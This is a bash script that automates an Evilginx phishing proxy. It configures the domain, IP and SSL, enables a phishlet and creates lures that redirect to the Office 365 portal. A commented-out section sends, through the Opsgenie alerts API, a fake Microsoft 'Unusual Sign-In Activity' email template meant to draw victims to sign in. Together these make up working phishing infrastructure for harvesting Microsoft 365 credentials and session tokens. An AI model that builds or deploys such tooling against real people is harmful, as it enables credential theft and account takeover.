#!/bin/bash
setup_evilginx() {
    echo "Setting up Evilginx for domain: $domain_name"

    # Load the phishlet
    sudo evilginx phishlets upload "$phishlet_path"

    # Enable the phishlet
    sudo evilginx phishlets enable example

    # Set up the hostname (domain or subdomain)
    sudo evilginx config domain "$subdomain"

    # Bind to the IP address
    sudo evilginx config ip "$host_ip"

    # Set up SSL using the provided certificate and key
    sudo evilginx config sslkey "$ssl_key_path"
    sudo evilginx config sslcert "$ssl_crt_path"
}

create_lure() {
    phishlet=$1
    hostname=$2
    redirect_url=$3
    
    # Create the lure
    sudo evilginx lures create "$phishlet"

    # Get the generated URL (Assuming the command outputs it)
    local lure_url
    lure_url=$(sudo evilginx lures get-url "$phishlet" "$hostname")

    # Set the redirect URL
    sudo evilginx lures redirect "$phishlet" "$redirect_url"
}

# Read configuration from config.json
config_file="config.json"
domain_name=$(jq -r '.EvilGinx2.Domain_Name' "$config_file")
host_ip=$(jq -r '.EvilGinx2.Host_IP' "$config_file")
ssl_key_path=$(jq -r '.EvilGinx2.SSL_Key_Path' "$config_file")
ssl_crt_path=$(jq -r '.EvilGinx2.SSL_CRT_Path' "$config_file")
default_phishlet=$(jq -r '.EvilGinx2.default_phishlet' "$config_file")
default_redirect=$(jq -r '.EvilGinx2.default_redirect' "$config_file")

# Automate multiple lure creation
create_lure $default_phishlet $domain_name "https://portal.office.com"
setup_evilginx

# send_opsgenie_alert() {
#     # Parameters passed to the function
#     local API_KEY="$1"
#     local API_URL="$2"
#     local HTML_CODE="$3"

#     # Escape double quotes inside the HTML content
#     local ESCAPED_HTML_CODE=$(echo "$HTML_CODE" | sed 's/"/\\"/g')

#     # Define the alert payload parameters
#     local MESSAGE="HTML Code Test Alert"
#     local DESCRIPTION="Here is the HTML code:\n\n$ESCAPED_HTML_CODE"
#     local ALIAS="html-code-test-001"
#     local PRIORITY="P3"
#     local USER="user@example.com"

#     # Send the alert using curl
#     local response=$(curl -s -X POST "$API_URL" \
#       -H "Authorization: GenieKey $API_KEY" \
#       -H "Content-Type: application/json" \
#       -d '{
#             "message": "'"$MESSAGE"'",
#             "description": "'"$DESCRIPTION"'",
#             "alias": "'"$ALIAS"'",
#             "priority": "'"$PRIORITY"'",
#             "user": "'"$USER"'"
#           }')

#     # Output the response from the API
#     echo "Response: $response"
# }

# # Example usage of the function
# API_KEY="YOUR_OPSGENIE_API_KEY"
# API_URL="https://api.opsgenie.com/v2/alerts"
# HTML_CODE="<html lang="en">
# <head>
#     <meta charset="UTF-8">
#     <meta name="viewport" content="width=device-width, initial-scale=1.0">
#     <title>Unusual Sign-in Activity</title>
#     <style>
#         @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;700&display=swap');
        
#         body {
#             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
#             background-color: #f3f2f1;
#             color: #333;
#             margin: 0;
#             padding: 0;
#         }
#         .container {
#             max-width: 600px;
#             margin: 40px auto;
#             background-color: #fff;
#             padding: 20px;
#             border-radius: 8px;
#             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
#         }
#         .header {
#             text-align: center;
#             padding: 10px;
#         }
#         .header img {
#             width: 150px;
#         }
#         .logo {
#             width: 200px;
#             margin: 20px 0;
#         }
#         h1 {
#             color: #005a9e;
#             font-size: 24px;
#         }
#         p {
#             line-height: 1.6;
#         }
#         .button-container {
#             text-align: center;
#             margin-top: 20px;
#         }
#         .btn {
#             display: inline-block;
#             padding: 12px 24px;
#             font-size: 16px;
#             color: #fff;
#             background-color: #0078d4;
#             border-radius: 4px;
#             text-decoration: none;
#             margin: 10px;
#             transition: background-color 0.3s ease;
#         }
#         .btn:hover {
#             background-color: #005a9e;
#         }
#         .footer {
#             text-align: center;
#             font-size: 12px;
#             color: #999;
#             margin-top: 40px;
#         }
#         .footer a {
#             color: #0078d4;
#             text-decoration: none;
#         }
#     </style>
# </head>
# <body>
#     <div class="container">
#         <div class="header">
#             <img src="https://upload.wikimedia.org/wikipedia/commons/d/db/Office_365_logo.svg" alt="Office 365" class="logo">
#         </div>
#         <h1>Unusual Sign-In Activity Detected</h1>
#         <p>We noticed an unusual sign-in attempt to your Office 365 account. For your security, please verify this activity.</p>
#         <p>If this was you, please sign in to your account to confirm your identity. If this wasn’t you, we recommend reviewing your account activity and changing your password immediately.</p>

#         <div class="button-container">
#             <a href="https://login.microsoftonline.com/" class="btn">Verify Sign-In</a>
#         </div>

#         <p>If you did not request this, no further action is required.</p>

#         <div class="footer">
#             <p>&copy; 2024 Microsoft Corporation. All rights reserved.</p>
#             <p><a href="https://privacy.microsoft.com">Privacy & Cookies</a> | <a href="https://support.microsoft.com">Support</a></p>
#         </div>
#     </div>
# </body>
# </html>"

# send_opsgenie_alert "$API_KEY" "$API_URL" "$HTML_CODE"
